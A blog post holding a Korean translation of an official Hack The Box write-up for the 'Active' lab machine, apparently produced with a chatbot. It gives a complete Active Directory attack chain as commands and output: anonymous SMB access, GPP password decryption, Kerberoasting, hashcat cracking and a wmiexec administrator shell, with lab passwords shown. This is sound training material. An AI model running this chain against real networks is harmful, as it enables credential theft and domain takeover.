---
layout: post
title: "[HTB][AD][Easy] Active (한글 번역)"
date:   2026-11-09 20:59:01 +09:00
categories: [AD, Easy]
---
**작성자:** C4rm310 & egre55
**머신 제작자:** eks & mrb3n
**날짜:** 2023년 11월 27일 / 문서 번호 D18.100.30
**난이도:** 쉬움 (Easy)
**분류:** 공식 (Official)

### 개요 (Synopsis)

Active는 Active Directory 환경에서 권한을 탈취하는 데 매우 자주 쓰이는 두 가지 기술을 특징으로 하는, 쉬움~중간 난이도의 Windows 머신이야.

### 요구 기술 (Skills Required)

* Active Directory 인증 및 공유 폴더에 대한 기본 지식

### 습득 기술 (Skills Learned)

* SMB 열거 (Enumeration) 기술
* 그룹 정책 기본 설정(Group Policy Preferences, GPP) 열거 및 악용
* Kerberoasting 공격이 가능한 계정 식별 및 악용

---

## 열거 (Enumeration)

### Nmap

먼저 타겟에 Nmap 스캔을 실행하는 것으로 시작해 볼게.

```bash
sudo masscan -p1-65535 TARGET_IP --rate 1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports TARGET_IP

```

```
Starting Nmap 7.93 (https://nmap.org) at 2023-11-27 10:08 GMT
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-27 10:08:23)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...

```

Nmap 결과를 보면 `active.htb`라는 도메인을 가진 Active Directory가 설치되어 있는 것을 알 수 있어. Microsoft DNS 6.1이 실행 중이므로 도메인 컨트롤러 운영체제가 Windows Server 2008 R2 SP1일 것으로 추정할 수 있지.

확인된 도메인을 우리의 `hosts` 파일에 추가해 줄게.

```bash
echo "TARGET_IP active.htb" | sudo tee -a /etc/hosts

```

### SMB

445번 포트가 열려 있으므로, `smbclient`를 사용해 익명 로그인(anonymous login)으로 접근 가능한 파일 공유를 열거할 수 있어.

```bash
$ smbclient -L //TARGET_IP
Password for [WORKGROUP\htb-c4rm310]:
Anonymous login successful

```

| Sharename | Type | Comment |
| --- | --- | --- |
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| NETLOGON | Disk | Logon server share |
| Replication | Disk |  |
| SYSVOL | Disk | Logon server share |
| Users | Disk |  |

익명 로그인이 허용되므로 사용 가능한 공유 목록을 볼 수 있어. 이제 `smbmap`을 사용해서 익명 자격 증명으로 접근할 수 있는 공유 폴더가 어떤 것인지 확인해 보자.

```bash
$ smbmap -H TARGET_IP
...
[+] IP: TARGET_IP:445 Name: active.htb

```

| Disk | Permissions | Comment |
| --- | --- | --- |
| ADMIN$ | NO ACCESS | Remote Admin |
| C$ | NO ACCESS | Default share |
| IPC$ | NO ACCESS | Remote IPC |
| NETLOGON | NO ACCESS | Logon server share |
| Replication | READ ONLY |  |
| SYSVOL | NO ACCESS | Logon server share |
| Users | NO ACCESS |  |

익명 계정으로 접근할 수 있는 유일한 공유 폴더는 `Replication`이야. 연결해서 내용을 살펴보면 `SYSVOL` 공유의 복제본인 것으로 보여.

이건 권한 상승 관점에서 아주 흥미로운데, 왜냐하면 그룹 정책(Group Policies)과 그룹 정책 기본 설정(Group Policy Preferences)이 인증된 모든 사용자가 읽을 수 있는 `SYSVOL` 내에 저장되기 때문이야.

`Replication` 공유에 접속해서 `Groups.xml` 파일에 특별히 주의를 기울이며 모든 내용을 재귀적으로 다운로드해 볼게. 이 파일에는 종종 사용자 이름과 비밀번호 조합이 포함되어 있어서 공격에 아주 유용해.

```bash
$ smbclient //TARGET_IP/Replication
Password for [WORKGROUP\htb-c4rm310]:
Anonymous login successful
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *

```

다운로드한 `Groups.xml` 파일의 내용은 다음과 같아.

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcgh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>

```

이 `Groups.xml` 파일에서 `SVC_TGS`라는 사용자 이름과 암호화된 비밀번호(`cpassword`)를 얻을 수 있었어.

---

## 초기 침투 (Foothold)

### 그룹 정책 기본 설정 (Group Policy Preferences)

그룹 정책 기본 설정(GPP)은 Windows Server 2008에 도입되었으며, 관리자가 네트워크 전체의 사용자와 그룹을 수정할 수 있게 해줘. 예를 들어, 회사 기본 이미지의 로컬 관리자 비밀번호가 너무 약해서 관리자가 나중에 더 강력한 것으로 설정하려고 할 때 사용할 수 있지.

이때 정의된 비밀번호는 AES-256으로 암호화되어 `Groups.xml`에 저장돼. 하지만 2012년에 Microsoft가 MSDN에 AES 키를 공개해 버렸기 때문에, GPP를 사용해 설정된 비밀번호는 이제 아주 쉽게 크랙할 수 있는 가장 손쉬운 타겟(low-hanging fruit)으로 여겨져.

암호화된 비밀번호를 추출해서 `gpp-decrypt` 도구를 사용해 복호화해보자.

```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcgh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ
GPPstillStandingStrong2k18

```

도메인 계정 `SVC_TGS`의 비밀번호는 `GPPstillStandingStrong2k18`이라는 걸 알아냈어.

### 인증된 열거 (Authenticated Enumeration)

이제 `active.htb` 도메인에 대한 유효한 자격 증명을 얻었으니 추가 열거를 진행할 수 있어. 이제 `SYSVOL` 및 `Users` 공유 폴더에도 접근이 가능할 거야.

```bash
$ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H TARGET_IP

```

접속해서 확인해 보면 `Users` 공유 폴더에 접근 가능하며, `SVC_TGS`의 바탕화면(Desktop)에서 사용자 플래그(user flag)를 가져올 수 있어.

```bash
$ smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //TARGET_IP/Users
smb: \> cd SVC_TGS/Desktop
smb: \SVC_TGS\Desktop\> get user.txt

```

---

## 권한 상승 (Privilege Escalation)

이제 `ldapsearch`를 사용해 도메인 컨트롤러에 Active Directory 계정의 `userAccountControl` 속성 및 적용된 설정을 쿼리할 수 있어. `userAccountControl` 값이 `2`이면 비활성화된 계정을 뜻하므로, 아래 쿼리는 비활성화되지 않은 활성 사용자 목록을 반환해.

```bash
$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" sAMAccountName | grep sAMAccountName

sAMAccountName: Administrator
sAMAccountName: SVC_TGS

```

우리가 이미 탈취한 계정 외에도 `Administrator` 계정이 활성화되어 있는 것을 볼 수 있어. Impacket의 `GetADUsers.py`를 사용하면 더 깔끔하게 도메인 사용자를 열거할 수 있지.

```bash
$ GetADUsers.py active.htb/svc_tgs -dc-ip TARGET_IP
Password: GPPstillStandingStrong2k18

```

| Name | Email | PasswordLastSet | LastLogon |
| --- | --- | --- | --- |
| Administrator |  | 2018-07-18 20:06:40.351723 | 2023-11-27 09:57:39.876136 |
| Guest |  | <never> | <never> |
| krbtgt |  | 2018-07-18 19:50:36.972031 | <never> |
| SVC_TGS |  | 2018-07-18 21:14:38.402764 | 2018-07-21 15:01:30.320277 |

### Kerberoasting

Active Directory 도메인 내에서 권한을 얻는 또 다른 흔한 기술은 2014년 DerbyCon에서 Tim Medin이 공개한 "Kerberoasting"이야.

이 공격은 Kerberos의 "TGS_REP(Ticket Granting Service 응답)"에서 암호화된 해시를 추출하고, 이를 오프라인에서 무차별 대입(Cracking)하여 평문 비밀번호를 알아내는 방식이야. 이게 가능한 이유는 TGS_REP가 해당 서비스 인스턴스가 실행되고 있는 계정의 NTLM 비밀번호 해시를 사용해 암호화되기 때문이지.

Kerberos 인증은 SPN(Service Principal Names)을 사용해 특정 서비스와 연결된 계정을 식별해. 이전의 `ldapsearch` 쿼리에 SPN 필터(`serviceprincipalname=*/*`)를 추가해서 SPN이 구성된 계정을 찾아보자.

```bash
$ ldapsearch -x -H 'ldap://TARGET_IP' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName

dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445

```

확인해 보니 `active\Administrator` 계정에 SPN이 설정되어 있네!

이제 Impacket의 `GetUserSPNs.py`를 사용해서 TGS를 요청하고 오프라인 크래킹을 위한 해시를 추출해 볼게.

```bash
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip TARGET_IP -request

```

*(성공적으로 Administrator 계정에 대한 Kerberos TGS 해시 값을 반환함)*

### Kerberos TGS 해시 크랙 (Cracking of Kerberos TGS Hash)

추출한 해시를 `hashcat`과 `rockyou.txt` 워드리스트를 이용해 크랙하면 `active\administrator`의 비밀번호가 `Ticketmaster1968`이라는 것을 알아낼 수 있어!

```bash
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
...
$krb5tgs$23$*Administrator$ACTIVE.HTB<...SNIP...>:Ticketmaster1968

```

### 기본 도메인 관리자 쉘 획득 (Shell as Primary Domain Admin)

마지막으로 Impacket의 `wmiexec.py`를 사용해 `active\administrator` 권한으로 쉘을 획득하고 루트 플래그(`root.txt`)를 읽을 수 있어.

```bash
$ wmiexec.py active.htb/administrator:Ticketmaster1968@TARGET_IP
C:\>whoami
active\administrator

```

최종 플래그는 `C:\Users\Administrator\Desktop\root.txt`에 위치해 있어.

---

번역이 완료되었어! 혹시 번역 내용 중에 이해가 안 가거나, 추가로 설명이 필요한 부분이 있으면 언제든지 말해줘!
